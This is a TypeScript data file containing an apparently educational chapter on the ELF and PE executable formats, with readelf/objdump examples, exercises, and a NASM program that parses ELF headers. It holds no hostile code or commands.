import { Chapter } from '../types';

export const CHAPTERS_LEVEL_5: Chapter[] = [
  {
    "id": 23,
    "slug": "chapter-23-executable-formats-elf-pe",
    "level": 5,
    "levelTitle": "Low-Level Systems and Reverse Engineering",
    "title": "Chapter 23: Executable Formats: ELF and PE",
    "subtitle": "Binary Anatomy, Program & Section Headers, Relocations, and Dynamic Linking",
    "learningObjectives": [
      "Understand what executable file formats are and why they exist.",
      "Master the ELF (Executable and Linkable Format) used on Linux and Unix-like systems.",
      "Explore the PE (Portable Executable) format used on Windows.",
      "Learn the structure of ELF: header, section headers, program headers, symbol tables, and relocation entries.",
      "Understand dynamic linking, the GOT and PLT, and how shared libraries are loaded.",
      "Analyze PE files: DOS header, PE header, optional header, section table, imports, exports, and relocations.",
      "Use tools like readelf, objdump, dumpbin, and hex editors to inspect executable files.",
      "Write assembly programs that interact with executable metadata (e.g., read ELF headers, resolve symbols).",
      "Recognize how executable formats enable loading, linking, and execution of programs."
    ],
    "prerequisites": [
      "Solid understanding of assembly programming and the build process (Chapters 4–5).",
      "Knowledge of system calls and OS interaction (Chapter 16).",
      "Familiarity with memory layout, sections, and linking (Chapters 4, 13).",
      "Basic understanding of dynamic linking and shared libraries (Chapter 4).",
      "Experience with Linux tools like readelf and objdump (Chapter 17)."
    ],
    "keyConcepts": [
      "An executable format defines how machine code, data, and metadata are organized in a file so the operating system can load and run it.",
      "ELF is the standard format for Linux, Unix, and many embedded systems. It supports both executables, relocatable objects, shared libraries, and core dumps.",
      "PE is the format used by Windows. It is based on the older COFF format and includes DOS compatibility headers.",
      "Sections contain code (.text), data (.data), uninitialized data (.bss), read-only data (.rodata), and other metadata.",
      "Segments (program headers in ELF) define memory mappings for loading.",
      "Symbol tables store names and addresses of functions and variables.",
      "Relocations describe how to patch addresses when the final load address is known.",
      "Dynamic linking uses a dynamic linker to resolve symbols at runtime, using structures like the Global Offset Table (GOT) and Procedure Linkage Table (PLT).",
      "Import/Export tables in PE serve a similar purpose for Windows DLLs."
    ],
    "diagramType": "executable_elf_pe",
    "sections": [
      {
        "id": "sec-23-1",
        "title": "23.1 Introduction to Executable Formats",
        "content": "When you assemble and link a program, the output is an executable file containing machine code, data, and metadata that tells the operating system how to load and execute it. The format of this file is crucial because the OS loader must interpret it correctly. Without a standard format, programs could not be shared across different machines or linkers.\n\nTwo dominant formats:\n- ELF (Executable and Linkable Format): Used on Linux, Unix, and many other systems. It is flexible, extensible, and supports static and dynamic linking.\n- PE (Portable Executable): Used on Windows. It evolved from the COFF format and includes DOS headers for backward compatibility.\n\nUnderstanding these formats is essential for low-level programming, reverse engineering, and malware analysis. In this chapter, we'll examine both formats in detail, focusing on ELF (since we use Linux) and providing a thorough overview of PE."
      },
      {
        "id": "sec-23-2",
        "title": "23.2 The ELF Format",
        "content": "ELF is a binary format defined by the Tool Interface Standard (TIS). It describes three main types of files:\n- Relocatable object files (.o): produced by assembler/compiler, contain code and data plus relocation info, not yet executable.\n- Executable files: ready to be loaded into memory and run; no unresolved symbols (unless dynamically linked).\n- Shared object files (.so): libraries that can be loaded at runtime and linked dynamically.\n- Core dumps: snapshots of process memory for debugging.\n\nAn ELF file consists of:\n1. ELF header: describes the file type, machine architecture, entry point, offsets to program and section headers.\n2. Program header table (optional for relocatable): describes segments to be loaded into memory.\n3. Section header table: describes sections (for linking and debugging).\n4. Sections: .text, .data, .bss, .rodata, .symtab, .strtab, .rela.text, etc.\n5. Segments: groups of sections with memory permissions (read, write, execute).\n\nClarification: The list contains four categories, including ET_CORE. ET_DYN also covers PIE executables."
      },
      {
        "id": "sec-23-2-1",
        "title": "23.2.1 ELF Header",
        "content": "The ELF header is the first part of the file. It has a fixed size (64 bytes for 64-bit). It can be inspected with readelf -h.\n\nKey fields:\n- e_ident[16]: magic number (0x7f 'E' 'L' 'F'), class (32/64-bit), data encoding, version.\n- e_type: ET_REL (relocatable), ET_EXEC (executable), ET_DYN (shared/PIE), ET_CORE.\n- e_machine: architecture (e.g., EM_X86_64 = 62).\n- e_version: always 1.\n- e_entry: virtual address of entry point (_start for executables).\n- e_phoff: offset to program header table.\n- e_shoff: offset to section header table.\n- e_flags: architecture-specific flags.\n- e_ehsize: size of ELF header (64 bytes).\n- e_phentsize: size of each program header entry.\n- e_phnum: number of program headers.\n- e_shentsize: size of each section header entry.\n- e_shnum: number of sections.\n- e_shstrndx: index of section name string table.\n\nExample: View ELF header",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "23.2.1 ELF Header — listing 1",
            "code": "readelf -h hello",
            "explanation": "Output:"
          },
          {
            "language": "text",
            "title": "23.2.1 ELF Header — listing 2",
            "code": "ELF Header:\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\n  Class:                             ELF64\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI Version:                       0\n  Type:                              EXEC (Executable file)\n  Machine:                           Advanced Micro Devices X86-64\n  Version:                           0x1\n  Entry point address:               0x400080\n  Start of program headers:          64 (bytes into file)\n  Start of section headers:          1320 (bytes into file)\n  Flags:                             0x0\n  Size of this header:               64 (bytes)\n  Size of program headers:           56 (bytes)\n  Number of program headers:         4\n  Size of section headers:           64 (bytes)\n  Number of section headers:         13\n  Section header string table index: 10"
          }
        ]
      },
      {
        "id": "sec-23-2-2",
        "title": "23.2.2 Program Headers (Segments)",
        "content": "Program headers describe how the file is mapped into memory. Each entry defines a segment with a type, virtual address, file offset, size in file, size in memory, permissions, and alignment.\n\nCommon segment types:\n- PT_LOAD: loadable segment; the loader maps these into memory.\n- PT_DYNAMIC: dynamic linking information.\n- PT_INTERP: path to the dynamic linker (e.g., /lib64/ld-linux-x86-64.so.2).\n- PT_PHDR: location of program header table itself.\n- PT_NOTE: auxiliary information.\n\nView program headers:\n\nClarification: The displayed outputs are illustrative, not a consistent dump from one binary. Iterate p_type to find PT_LOAD; PT_PHDR or PT_INTERP may come first. See the System V ABI: https://refspecs.linuxfoundation.org/elf/gabi4+/ch5.pheader.html",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "23.2.2 Program Headers (Segments) — listing 1",
            "code": "readelf -l hello",
            "explanation": "Example:"
          },
          {
            "language": "text",
            "title": "23.2.2 Program Headers (Segments) — listing 2",
            "code": "Program Headers:\n  Type           Offset             VirtAddr           PhysAddr\n                 FileSiz            MemSiz              Flags  Align\n  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040\n                 0x00000000000001f8 0x00000000000001f8  R      8\n  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238\n                 0x000000000000001c 0x000000000000001c  R      1\n      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\n  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000\n                 0x00000000000000e0 0x00000000000000e0  R E    200000\n  LOAD           0x00000000000000e0 0x00000000006000e0 0x00000000006000e0\n                 0x000000000000001c 0x000000000000001c  RW     200000\n  DYNAMIC        0x00000000000000e0 0x00000000006000e0 0x00000000006000e0\n                 0x000000000000001c 0x000000000000001c  RW     8\n  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254\n                 0x0000000000000044 0x0000000000000044  R      4\n  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000\n                 0x0000000000000000 0x0000000000000000  RW     10",
            "explanation": "The INTERP segment tells the kernel to load the dynamic linker, which then loads shared libraries and performs relocations before jumping to the entry point."
          }
        ]
      },
      {
        "id": "sec-23-2-3",
        "title": "23.2.3 Sections",
        "content": "Sections are the linkable units of an object file. They contain code, data, symbol tables, relocation entries, and debugging information. In an executable, sections are still present but less critical for execution; program headers are what the loader uses.\n\nCommon sections:\n- .text: executable code.\n- .data: initialized writable data.\n- .bss: uninitialized data (zero-filled at load).\n- .rodata: read-only data (strings, constants).\n- .symtab: symbol table.\n- .strtab: string table for symbol names.\n- .rela.text, .rela.data: relocation entries.\n- .got, .plt: for dynamic linking.\n\nView sections:\n\nClarification: SHT_NOBITS .bss has a logical sh_size but no file-backed payload. Section headers can be absent from an executable; program headers govern loading.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "23.2.3 Sections — listing 1",
            "code": "readelf -S hello"
          }
        ]
      },
      {
        "id": "sec-23-2-4",
        "title": "23.2.4 Symbol Table",
        "content": "The symbol table maps names to addresses or offsets. It is essential for linking and debugging. Symbols can be functions, variables, or section names.\n\nView symbols:",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "23.2.4 Symbol Table — listing 1",
            "code": "readelf -s hello",
            "explanation": "Example:"
          },
          {
            "language": "text",
            "title": "23.2.4 Symbol Table — listing 2",
            "code": "Symbol table '.symtab' contains 10 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND\n     1: 00000000004000b0     0 SECTION LOCAL  DEFAULT    1\n     2: 00000000004000d0     0 SECTION LOCAL  DEFAULT    2\n     3: 00000000004000f8     0 SECTION LOCAL  DEFAULT    3\n     4: 00000000006000e0     0 SECTION LOCAL  DEFAULT    4\n     5: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.o\n     6: 00000000004000b0    43 FUNC    GLOBAL DEFAULT    1 _start\n     7: 00000000006000e0    14 OBJECT  GLOBAL DEFAULT    4 msg\n     8: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND __bss_start\n     9: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _edata",
            "explanation": "In dynamically linked executables, many symbols are undefined (UND) and resolved at runtime."
          }
        ]
      },
      {
        "id": "sec-23-2-5",
        "title": "23.2.5 Relocations",
        "content": "Relocations describe how to patch addresses when the final load address is known. For relocatable objects, relocations are essential. For executables, if position-independent (PIE), relocations may still be present for dynamic linking.\n\nTwo types:\n- R_X86_64_RELATIVE: relative to base address.\n- R_X86_64_GLOB_DAT: absolute address of a global symbol.\n- R_X86_64_JUMP_SLOT: address of a PLT entry.\n- R_X86_64_PC32: 32-bit PC-relative.\n\nView relocations:\n\nClarification: The list contains four relocation examples. JUMP_SLOT writes the resolved function address into its relocation target, usually a GOT slot, rather than the address of a PLT entry.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "23.2.5 Relocations — listing 1",
            "code": "readelf -r hello"
          }
        ]
      },
      {
        "id": "sec-23-2-6",
        "title": "23.2.6 Dynamic Linking",
        "content": "Dynamic linking defers symbol resolution to load time. The executable contains a DYNAMIC segment with pointers to the dynamic linker's required structures. The Global Offset Table (GOT) and Procedure Linkage Table (PLT) are used to call shared library functions.\n\n- GOT: table of addresses; initially points to PLT stubs, later patched to actual function addresses.\n- PLT: small stubs that jump through GOT; the first call triggers lazy resolution via the dynamic linker.\n\nWe'll examine these more in Chapter 24 (Disassembly and Reading Compiler-Generated Assembly).\n\nClarification: Only certain function slots initially route through lazy PLT resolution. Other GOT entries hold data addresses; eager binding resolves functions before first use."
      },
      {
        "id": "sec-23-3",
        "title": "23.3 The PE Format",
        "content": "The Portable Executable (PE) format is used by Windows. It is based on COFF (Common Object File Format) and retains a DOS MZ header for backward compatibility. PE files include .exe, .dll, .sys, .obj, etc.\n\nA PE file consists of:\n1. DOS Header (64 bytes): starts with \"MZ\" magic, contains a pointer to the PE header.\n2. DOS Stub: a small DOS program that prints \"This program cannot be run in DOS mode.\"\n3. PE Header: starts with \"PE\\0\\0\" signature, followed by COFF File Header.\n4. Optional Header (not optional for executables): contains entry point, image base, section alignment, file alignment, subsystem, etc.\n5. Section Table: describes each section (.text, .data, .rdata, .idata, .reloc, etc.).\n6. Sections: raw data.\n\nClarification: Ordinary .obj files are COFF objects, not PE images with MZ/PE wrappers. The conventional DOS message is not a required exact string. Reference: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format"
      },
      {
        "id": "sec-23-3-1",
        "title": "23.3.1 DOS Header and Stub",
        "content": "The DOS header is 64 bytes, starting with 0x5A4D (\"MZ\"). At offset 0x3C is a 4-byte offset to the PE header. The DOS stub is a small program that runs in real mode if the file is executed in DOS."
      },
      {
        "id": "sec-23-3-2",
        "title": "23.3.2 PE Header (COFF File Header)",
        "content": "The PE header starts with the signature 0x00004550 (\"PE\\0\\0\"). After that is a COFF File Header:\n\nFields:\n- Machine: target architecture (e.g., 0x8664 for x64).\n- NumberOfSections: number of sections.\n- TimeDateStamp: build timestamp.\n- PointerToSymbolTable: deprecated (0).\n- NumberOfSymbols: deprecated (0).\n- SizeOfOptionalHeader: size of optional header.\n- Characteristics: flags (e.g., executable, 32-bit/64-bit, DLL).\n\nClarification: TimeDateStamp is not reliable evidence of build time, especially with reproducible builds. COFF objects can use the symbol-table fields."
      },
      {
        "id": "sec-23-3-3",
        "title": "23.3.3 Optional Header",
        "content": "The Optional Header contains critical loading information:\n\n- Magic: 0x10B for PE32, 0x20B for PE32+ (64-bit).\n- AddressOfEntryPoint: RVA (relative virtual address) of entry point.\n- ImageBase: preferred load address.\n- SectionAlignment: alignment of sections in memory (usually 0x1000).\n- FileAlignment: alignment of raw data in file (usually 0x200).\n- SizeOfImage: total size in memory.\n- SizeOfHeaders: size of all headers.\n- Subsystem: 2 for GUI, 3 for console.\n- DllCharacteristics: flags like ASLR, DEP, etc.\n- NumberOfRvaAndSizes: number of data directory entries.\n- DataDirectory[16]: array of directories (imports, exports, relocations, TLS, etc.).\n\nClarification: Runtime entry VA = actual image base + entry RVA. RVA is not a file offset. Bound directory reads by the declared optional-header size and directory count; the certificate directory uses a file offset."
      },
      {
        "id": "sec-23-3-4",
        "title": "23.3.4 Section Table",
        "content": "Each section has a header:\n- Name (8 bytes)\n- VirtualSize, VirtualAddress (RVA)\n- SizeOfRawData, PointerToRawData\n- Characteristics (readable, writable, executable)\n\nCommon sections:\n- .text: code\n- .data: initialized data\n- .rdata: read-only data (imports, strings)\n- .idata: import directory\n- .edata: export directory\n- .reloc: base relocations\n- .rsrc: resources\n- .pdata: exception information (64-bit)\n\nClarification: Section names are conventions. For a file-backed RVA inside a section, offset = PointerToRawData + RVA − VirtualAddress; check that the displacement and read length fit SizeOfRawData and the file."
      },
      {
        "id": "sec-23-3-5",
        "title": "23.3.5 Import and Export Tables",
        "content": "PE uses import and export directories to handle DLL linking.\n\n- Import Directory: lists DLLs and functions imported. Each entry points to an Import Lookup Table (ILT) and Import Address Table (IAT). The IAT is patched by the loader with actual function addresses.\n- Export Directory: for DLLs, lists functions exported by name or ordinal."
      },
      {
        "id": "sec-23-3-6",
        "title": "23.3.6 Relocations",
        "content": "PE uses base relocations (.reloc section) for when the image cannot be loaded at its preferred base (e.g., due to ASLR). Relocation entries specify page offsets and type."
      },
      {
        "id": "sec-23-4",
        "title": "23.4 Comparing ELF and PE",
        "content": "ELF is more uniform and flexible; PE carries legacy DOS baggage but is well-documented.",
        "tableData": {
          "headers": [
            "Feature",
            "ELF",
            "PE"
          ],
          "rows": [
            [
              "Platform",
              "Unix/Linux",
              "Windows"
            ],
            [
              "Magic",
              "7f 45 4c 46",
              "4d 5a (\"MZ\")"
            ],
            [
              "Header",
              "ELF header + Program/Section headers",
              "DOS header + PE header + Optional header"
            ],
            [
              "Entry point",
              "e_entry in ELF header",
              "AddressOfEntryPoint in Optional Header"
            ],
            [
              "Dynamic linking",
              "GOT/PLT + dynamic linker",
              "Import Address Table (IAT)"
            ],
            [
              "Relocations",
              ".rela.text etc.",
              ".reloc section"
            ],
            [
              "Shared libraries",
              ".so",
              ".dll"
            ],
            [
              "Tooling",
              "readelf, objdump",
              "dumpbin, objdump (with PE support)"
            ]
          ]
        }
      },
      {
        "id": "sec-23-5",
        "title": "23.5 Tools for Analyzing Executables",
        "content": ""
      },
      {
        "id": "sec-23-5-1",
        "title": "23.5.1 For ELF",
        "content": "- readelf: Display ELF header, sections, program headers, symbols, relocations.\n- objdump: Disassemble, dump sections, show headers.\n- nm: List symbols.\n- ldd: Print shared library dependencies.\n- strings: Extract printable strings.\n- Hex editors (xxd, hexdump) for raw byte analysis.\n\nClarification: For unfamiliar files, inspect dependency metadata with readelf -d or objdump -p; some ldd implementations can execute a file. DT_NEEDED lists direct dependencies, not the complete transitive runtime dependency graph."
      },
      {
        "id": "sec-23-5-2",
        "title": "23.5.2 For PE",
        "content": "- objdump -x file.exe: Display PE header, sections, symbols (if not stripped).\n- dumpbin (Visual Studio): Powerful PE analyzer.\n- PEview, CFF Explorer: GUI tools for detailed inspection.\n- strings, xxd.\n\nOn Linux, you can analyze PE files with objdump (if built with PE support) or use Wine tools."
      },
      {
        "id": "sec-23-6",
        "title": "23.6 Practical Example: Reading ELF Header in Assembly",
        "content": "We can write an assembly program that opens its own executable file and parses the ELF header to print the entry point. This demonstrates understanding of the format.\n\nClarification: The original overwrites the entry address in RAX with the write return count, prints a NUL in the prefix, and does not validate argc, read length or ELF identification. Use the complete corrected parser below. Addresses vary by linker; PIE values are before load bias. This is a bounded header inspector, not a complete ELF validator; it stops at the first PT_LOAD, supports ordinary ELF64 little-endian headers, and explicitly rejects extended program-header counts.",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Original source parser — entry value overwritten by write",
            "code": "; readelf_header.asm\n; Opens own executable (path passed via argv) and prints entry point.\n; Syscalls: open, read, write, close, exit.\n\nsection .data\n    msg db 'Entry point: 0x', 0\n    msg_len equ $ - msg\n    newline db 0xA\n\nsection .bss\n    fd resq 1\n    elf_header resb 64       ; enough for ELF header\n    buffer resb 16           ; for hex conversion\n\nsection .text\nglobal _start\n\n_start:\n    ; open file: argv[1] is at [rsp+16]? Actually _start has argc at [rsp], argv[0] at [rsp+8], argv[1] at [rsp+16]\n    mov rax, 2              ; open\n    mov rdi, [rsp+16]       ; argv[1] = filename\n    xor rsi, rsi            ; O_RDONLY\n    syscall\n    test rax, rax\n    js  .error\n    mov [fd], rax\n\n    ; read first 64 bytes (ELF header)\n    mov rax, 0              ; read\n    mov rdi, [fd]\n    mov rsi, elf_header\n    mov rdx, 64\n    syscall\n\n    ; extract e_entry (offset 0x18 in ELF64 header) - 8 bytes\n    ; For simplicity, we'll assume 64-bit little-endian\n    mov rax, [elf_header + 0x18]   ; entry point\n\n    ; Print message\n    mov rax, 1\n    mov rdi, 1\n    mov rsi, msg\n    mov rdx, msg_len\n    syscall\n\n    ; Convert entry point (in rax) to hex string and print\n    ; We'll store in buffer as 16 hex digits\n    lea rdi, [buffer + 15]\n    mov rcx, 16\n    mov rbx, rax\n.hex_loop:\n    mov rax, rbx\n    and rax, 0xF\n    cmp rax, 10\n    jl  .digit\n    add rax, 'A' - 10\n    jmp .store\n.digit:\n    add rax, '0'\n.store:\n    mov [rdi], al\n    dec rdi\n    shr rbx, 4\n    dec rcx\n    jnz .hex_loop\n\n    ; print buffer\n    mov rax, 1\n    mov rdi, 1\n    mov rsi, buffer\n    mov rdx, 16\n    syscall\n\n    ; newline\n    mov rax, 1\n    mov rdi, 1\n    mov rsi, newline\n    mov rdx, 1\n    syscall\n\n    ; close file\n    mov rax, 3\n    mov rdi, [fd]\n    syscall\n\n    ; exit\n    mov rax, 60\n    xor rdi, rdi\n    syscall\n\n.error:\n    mov rax, 60\n    mov rdi, 1\n    syscall",
            "explanation": "Assemble and run:"
          },
          {
            "language": "bash",
            "title": "23.6 Practical Example: Reading ELF Header in Assembly — listing 2",
            "code": "nasm -f elf64 readelf_header.asm -o readelf_header.o\nld readelf_header.o -o readelf_header\n./readelf_header ./readelf_header",
            "explanation": "Output:"
          },
          {
            "language": "text",
            "title": "23.6 Practical Example: Reading ELF Header in Assembly — listing 3",
            "code": "Entry point: 0x00000000004000B0",
            "explanation": "This demonstrates reading and parsing the ELF header."
          },
          {
            "language": "nasm",
            "title": "Corrected ELF header and PT_LOAD inspector",
            "code": "; Linux x86-64, NASM. Inspect ELF64 little-endian headers, without executing input.\n; nasm -f elf64 elf23.asm -o elf23.o && ld elf23.o -o elf23\n; ./elf23 /bin/true\n; Exit 1: invalid/unsupported/truncated input or I/O error. PN_XNUM unsupported.\ndefault rel\nsection .data\nentry_msg db 'Entry point: 0x'\nentry_len equ $-entry_msg\ncount_msg db 'Program headers (hex): 0x'\ncount_len equ $-count_msg\nload_msg db 'First PT_LOAD vaddr: 0x'\nload_len equ $-load_msg\nnone_msg db 'No PT_LOAD segment',10\nnone_len equ $-none_msg\nhexchars db '0123456789ABCDEF'\nsection .bss\nhdr resb 64\nph resb 56\nhexbuf resb 17\nsection .text\nglobal _start\n_start:\n    cmp qword [rsp],2\n    jne fail\n    mov rdi,[rsp+16]\n    mov eax,2\n    xor esi,esi\n    xor edx,edx\n    syscall\n    test rax,rax\n    js fail\n    mov r12,rax\n    lea rsi,[hdr]\n    mov edx,64\n    xor r10d,r10d\n    call read_exact\n    cmp dword [hdr],0x464c457f\n    jne fail\n    cmp byte [hdr+4],2\n    jne fail\n    cmp byte [hdr+5],1\n    jne fail\n    cmp byte [hdr+6],1\n    jne fail\n    cmp dword [hdr+20],1\n    jne fail\n    cmp word [hdr+52],64\n    jne fail\n    movzx r14d,word [hdr+56]\n    cmp r14d,65535\n    je fail\n    mov rax,[hdr+24]\n    lea rsi,[entry_msg]\n    mov edx,entry_len\n    call print_hex\n    mov eax,r14d\n    lea rsi,[count_msg]\n    mov edx,count_len\n    call print_hex\n    test r14d,r14d\n    jz no_load\n    cmp word [hdr+54],56\n    jne fail\n    mov r13,[hdr+32]\n    cmp r13,64\n    jb fail\nnext_ph:\n    lea rsi,[ph]\n    mov edx,56\n    mov r10,r13\n    call read_exact\n    cmp dword [ph],1\n    je found\n    add r13,56\n    jc fail\n    dec r14d\n    jnz next_ph\nno_load:\n    lea rsi,[none_msg]\n    mov edx,none_len\n    call write_all\n    jmp done\nfound:\n    mov rax,[ph+16]\n    lea rsi,[load_msg]\n    mov edx,load_len\n    call print_hex\ndone:\n    mov eax,3\n    mov rdi,r12\n    syscall\n    xor edi,edi\n    jmp quit\nfail:\n    mov edi,1\nquit:\n    mov eax,60\n    syscall\n; pread64: R12 fd, RSI destination, RDX size, R10 offset.\n; The kernel checks file access; short reads and EINTR are handled.\nread_exact:\n    mov eax,17\n    mov rdi,r12\n    syscall\n    cmp rax,-4\n    je read_exact\n    test rax,rax\n    jle fail\n    add rsi,rax\n    add r10,rax\n    jc fail\n    sub rdx,rax\n    jnz read_exact\n    ret\n; Print RAX as 16 hex digits after prefix RSI/RDX.\nprint_hex:\n    push rax\n    call write_all\n    pop rax\n    lea rdi,[hexbuf+15]\n    lea r8,[hexchars]\n    mov ecx,16\n.hex:\n    mov r9,rax\n    and r9d,15\n    mov r9b,[r8+r9]\n    mov [rdi],r9b\n    dec rdi\n    shr rax,4\n    loop .hex\n    mov byte [hexbuf+16],10\n    lea rsi,[hexbuf]\n    mov edx,17\nwrite_all:\n    mov eax,1\n    mov edi,1\n    syscall\n    cmp rax,-4\n    je write_all\n    test rax,rax\n    jle fail\n    add rsi,rax\n    sub rdx,rax\n    jnz write_all\n    ret\nsection .note.GNU-stack noalloc noexec nowrite progbits",
            "explanation": "Reports entry, program-header count in hexadecimal, and first PT_LOAD address. Handles short reads, EINTR and missing/truncated input. Kernel process exit closes the descriptor on errors."
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-23-1",
        "title": "Exercise 23.1: Explore ELF Sections",
        "description": "Use readelf -S on a simple assembly executable. List the sections and their flags. Identify which sections are loaded into memory (look at program headers).",
        "solution": "readelf -SW ./elf23\nreadelf -lW ./elf23\n# Compare section flags and the Section to Segment mapping.\n# A=allocated, W=writable, X=executable; .bss is NOBITS.",
        "solutionExplanation": "Use readelf -S hello. Sections like .text have AX flags (allocated, executable), .data have WA, .bss has WA but no file size. Program headers show which sections map to memory. More precisely, .bss may show a nonzero section size although its zero-filled bytes occupy no file payload.",
        "solutionLanguage": "bash"
      },
      {
        "id": "ex-23-2",
        "title": "Exercise 23.2: Parse ELF Program Headers",
        "description": "Modify the assembly program in 23.6 to also print the number of program headers (e_phnum at offset 0x38) and the virtual address of the first PT_LOAD segment.",
        "solution": "; Linux x86-64, NASM. Inspect ELF64 little-endian headers, without executing input.\n; nasm -f elf64 elf23.asm -o elf23.o && ld elf23.o -o elf23\n; ./elf23 /bin/true\n; Exit 1: invalid/unsupported/truncated input or I/O error. PN_XNUM unsupported.\ndefault rel\nsection .data\nentry_msg db 'Entry point: 0x'\nentry_len equ $-entry_msg\ncount_msg db 'Program headers (hex): 0x'\ncount_len equ $-count_msg\nload_msg db 'First PT_LOAD vaddr: 0x'\nload_len equ $-load_msg\nnone_msg db 'No PT_LOAD segment',10\nnone_len equ $-none_msg\nhexchars db '0123456789ABCDEF'\nsection .bss\nhdr resb 64\nph resb 56\nhexbuf resb 17\nsection .text\nglobal _start\n_start:\n    cmp qword [rsp],2\n    jne fail\n    mov rdi,[rsp+16]\n    mov eax,2\n    xor esi,esi\n    xor edx,edx\n    syscall\n    test rax,rax\n    js fail\n    mov r12,rax\n    lea rsi,[hdr]\n    mov edx,64\n    xor r10d,r10d\n    call read_exact\n    cmp dword [hdr],0x464c457f\n    jne fail\n    cmp byte [hdr+4],2\n    jne fail\n    cmp byte [hdr+5],1\n    jne fail\n    cmp byte [hdr+6],1\n    jne fail\n    cmp dword [hdr+20],1\n    jne fail\n    cmp word [hdr+52],64\n    jne fail\n    movzx r14d,word [hdr+56]\n    cmp r14d,65535\n    je fail\n    mov rax,[hdr+24]\n    lea rsi,[entry_msg]\n    mov edx,entry_len\n    call print_hex\n    mov eax,r14d\n    lea rsi,[count_msg]\n    mov edx,count_len\n    call print_hex\n    test r14d,r14d\n    jz no_load\n    cmp word [hdr+54],56\n    jne fail\n    mov r13,[hdr+32]\n    cmp r13,64\n    jb fail\nnext_ph:\n    lea rsi,[ph]\n    mov edx,56\n    mov r10,r13\n    call read_exact\n    cmp dword [ph],1\n    je found\n    add r13,56\n    jc fail\n    dec r14d\n    jnz next_ph\nno_load:\n    lea rsi,[none_msg]\n    mov edx,none_len\n    call write_all\n    jmp done\nfound:\n    mov rax,[ph+16]\n    lea rsi,[load_msg]\n    mov edx,load_len\n    call print_hex\ndone:\n    mov eax,3\n    mov rdi,r12\n    syscall\n    xor edi,edi\n    jmp quit\nfail:\n    mov edi,1\nquit:\n    mov eax,60\n    syscall\n; pread64: R12 fd, RSI destination, RDX size, R10 offset.\n; The kernel checks file access; short reads and EINTR are handled.\nread_exact:\n    mov eax,17\n    mov rdi,r12\n    syscall\n    cmp rax,-4\n    je read_exact\n    test rax,rax\n    jle fail\n    add rsi,rax\n    add r10,rax\n    jc fail\n    sub rdx,rax\n    jnz read_exact\n    ret\n; Print RAX as 16 hex digits after prefix RSI/RDX.\nprint_hex:\n    push rax\n    call write_all\n    pop rax\n    lea rdi,[hexbuf+15]\n    lea r8,[hexchars]\n    mov ecx,16\n.hex:\n    mov r9,rax\n    and r9d,15\n    mov r9b,[r8+r9]\n    mov [rdi],r9b\n    dec rdi\n    shr rax,4\n    loop .hex\n    mov byte [hexbuf+16],10\n    lea rsi,[hexbuf]\n    mov edx,17\nwrite_all:\n    mov eax,1\n    mov edi,1\n    syscall\n    cmp rax,-4\n    je write_all\n    test rax,rax\n    jle fail\n    add rsi,rax\n    sub rdx,rax\n    jnz write_all\n    ret\nsection .note.GNU-stack noalloc noexec nowrite progbits",
        "solutionExplanation": "Add code to read e_phnum (2 bytes at offset 0x38) and e_phoff (8 bytes at offset 0x20). Then read the first program header entry (56 bytes) to get p_vaddr (offset 0x10 in program header). Print these. Correction: the first entry need not be PT_LOAD. The complete solution iterates entries, validates the 56-byte entry size, and reports no load segment when none exists.",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-23-3",
        "title": "Exercise 23.3: PE Header Analysis",
        "description": "If you have a Windows executable or can create one with a cross-compiler, use objdump -x or a PE tool to view the DOS header, PE header, and sections. Note the entry point and image base.",
        "solution": "objdump -x file.exe\nobjdump -h file.exe\nxxd -l 64 file.exe\n# On a Visual Studio developer command prompt:\n# dumpbin /headers file.exe\n# Record AddressOfEntryPoint (RVA), ImageBase and section permissions.",
        "solutionExplanation": "If using objdump -x file.exe, look for \"PE signature found\" and the subsequent headers. The entry point is in the optional header. Tool wording varies; do not require the literal PE signature found. Compare the MZ bytes and e_lfanew with the PE signature in a hex viewer. A Windows executable is a prerequisite for this optional exercise.",
        "solutionLanguage": "bash"
      },
      {
        "id": "ex-23-4",
        "title": "Exercise 23.4: Dynamic Linking Structures",
        "description": "For a dynamically linked ELF executable (e.g., one using printf), use readelf -d to view the dynamic section. Identify the DT_NEEDED entries and the address of the GOT.",
        "solution": "cat > program.c <<'C'\n#include <stdio.h>\nint main(int argc, char **argv) {\n    (void)argv;\n    printf(\"argc=%d\\n\", argc);\n    return 0;\n}\nC\ngcc -O0 program.c -o program\nreadelf -dW ./program\nreadelf -rW ./program\nreadelf -SW ./program\n# Inspect NEEDED, PLTGOT when present, and .got/.got.plt sections.",
        "solutionExplanation": "readelf -d ./program shows NEEDED libc.so.6, GOT address, etc. PLTGOT is a dynamic tag when present; exact addresses and relocation layout depend on the linker and build options.",
        "solutionLanguage": "bash"
      },
      {
        "id": "ex-23-5",
        "title": "Exercise 23.5: Symbol Resolution",
        "description": "Write an assembly program that defines a global variable and a function. Use nm to list symbols and their addresses. Compare with readelf -s.",
        "solution": "; nasm -f elf64 symbols.asm -o symbols.o\n; ld symbols.o -o symbols\n; nm -n symbols; readelf -sW symbols\n; ./symbols; echo $?      # 42\ndefault rel\nsection .data\nglobal value:data\nvalue dq 41\nsection .text\nglobal _start\nglobal increment:function\nincrement:\n    inc qword [value]\n    mov rax,[value]\n    ret\n_start:\n    call increment\n    mov rdi,rax\n    mov eax,60\n    syscall\nsection .note.GNU-stack noalloc noexec nowrite progbits",
